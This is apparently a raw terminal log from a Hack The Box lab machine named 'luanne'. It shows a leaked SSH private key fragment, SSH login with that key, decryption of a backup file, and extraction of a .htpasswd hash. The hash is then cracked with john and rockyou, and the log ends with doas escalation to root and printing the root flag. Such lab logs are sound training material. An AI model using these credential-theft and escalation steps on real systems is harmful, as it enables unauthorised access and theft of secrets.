++ztOM/3WmmlsERG2GOcFPxz0L2uVFve8PtNpJvy3MxaYl/zwZKkvIXtqu+WXXpFxXOP9qc
+f2jJom8mmRLvGFOe0akCBV2NCGq/nJ4bn0B9vuexwEpxax4QAAAMEA44eCmj/6raALAYcO
+D1UZwPTuJHZ/89jaET6At6biCmfaBqYuhbvDYUa9C3LfWsq+07/S7khHSPXoJD0DjXAIZk
+N+59o58CG82wvGl2RnwIpIOIFPoQyim/T0q0FN6CIFe6csJg8RDdvq2NaD6k6vKSk6rRgo
+IH3BXK8fc7hLQw58o5kwdFakClbs/q9+Uc7lnDBmo33ytQ9pqNVuu6nxZqI2lG88QvWjPg
+nUtRpvXwMi0/QMLzzoC6TJwzAn39GXAAAAwQDVMhwBL97HThxI60inI1SrowaSpMLMbWqq
+189zIG0dHfVDVQBCXd2Rng15eN5WnsW2LL8iHL25T5K2yi+hsZHU6jJ0CNuB1X6ITuHhQg
+QLAuGW2EaxejWHYC5gTh7jwK6wOwQArJhU48h6DFl+5PUO8KQCDBC9WaGm3EVXbPwXlzp9
+9OGmTT9AggBQJhLiXlkoSMReS36EYkxEncYdWM7zmC2kkxPTSVWz94I87YvApj0vepuB7b
+45bBkP5xOhrjMAAAAVci5taWNoYWVsc0BsdWFubmUuaHRiAQIDBAUG
+-----END OPENSSH PRIVATE KEY-----
+$    
+
+oot@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/luanne# sudo ssh -i id_rsa r.michaels@10.10.10.218
+Last login: Tue Jan  5 14:15:17 2021 from 10.10.14.21
+NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020
+
+Welcome to NetBSD!
+
+luanne$ ls
+backups      devel        public_html  user.txt
+luanne$ cd backups
+luanne$ ls
+devel_backup-2020-09-16.tar.gz.enc
+luanne$ netgp
+ksh: netgp: not found
+luanne$ netphp
+ksh: netphp: not found
+luanne$ netpgp
+NetPGP portable 3.99.17/[20101103]
+All bug reports, praise and chocolate, please, to:
+Alistair Crooks <agc@netbsd.org> c0596823
+Usage: netpgp COMMAND OPTIONS:
+netpgp  --help OR
+        --encrypt [--output=file] [options] files... OR
+        --decrypt [--output=file] [options] files... OR
+
+        --sign [--armor] [--detach] [--hash=alg] [--output=file]
+                [options] files... OR
+        --verify [options] files... OR
+        --cat [--output=file] [options] files... OR
+        --clearsign [--output=file] [options] files... OR
+        --list-packets [options] OR
+        --version
+where options are:
+        [--cipher=<ciphername>] AND/OR
+        [--coredumps] AND/OR
+        [--homedir=<homedir>] AND/OR
+        [--keyring=<keyring>] AND/OR
+        [--numtries=<attempts>] AND/OR
+        [--userid=<userid>] AND/OR
+        [--maxmemalloc=<number of bytes>] AND/OR
+        [--verbose]
+9-16.tar.gz.enc --output=/tmp/forroot.tar.gz                                    <
+signature  2048/RSA (Encrypt or Sign) 3684eb1e5ded454a 2020-09-14 
+Key fingerprint: 027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a 
+uid              RSA 2048-bit key <r.michaels@localhost>
+luanne$ cd /tmp
+luanne$ ls
+forroot.tar.gz
+luanne$ tar forroot.tar.gz
+tar: Option f requires an argument
+Usage:
+  List:    tar -tf <archive-filename>
+  Extract: tar -xf <archive-filename>
+  Create:  tar -cf <archive-filename> [filenames...]
+  Help:    tar --help
+luanne$ tar xf forroot.tar.gz
+luanne$ ls
+devel-2020-09-16    forroot.tar.gz
+luanne$ cd devel-2020-09-16
+luanne$ ls
+webapi www
+luanne$ cd www
+luanne$ ls
+index.html
+luanne$ ls -lah
+total 617B
+drwxr-xr-x  2 r.michaels  wheel   96B Sep 16 15:03 .
+drwxr-x---  4 r.michaels  wheel   96B Sep 16 15:02 ..
+-rw-r--r--  1 r.michaels  wheel   47B Sep 16 18:14 .htpasswd
+-rw-r--r--  1 r.michaels  wheel  378B Sep 16 15:03 index.html
+luanne$ cat .htpasswd
+webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.
+luanne$ sus su
+ksh: sus: not found
+luanne$ doas su
+Password:
+doas: authentication failed
+luanne$ doas su
+Password:
+sh: Cannot determine current working directory
+# ls
+# pwd
+pwd: getcwd() failed: No such file or directory
+# cd /root
+# ls
+.cshrc     .klogin    .login     .profile   .shrc      cleanup.sh root.txt
+# cat root.txt
+7a9b5c206e8e8ba09bb99bd113675f66
+# ^Z
+# exit
+luanne$ exit
+Connection to 10.10.10.218 closed.
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/luanne# 
+
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/luanne# john --wordlist=/usr/share/wordlists/rockyou.txt hashroot
+Loaded 1 password hash (md5crypt [MD5 32/64 X2])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+littlebear       (webapi_user)
+1g 0:00:00:01 100% 0.6289g/s 8120p/s 8120c/s 8120C/s littlebear..limewire
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
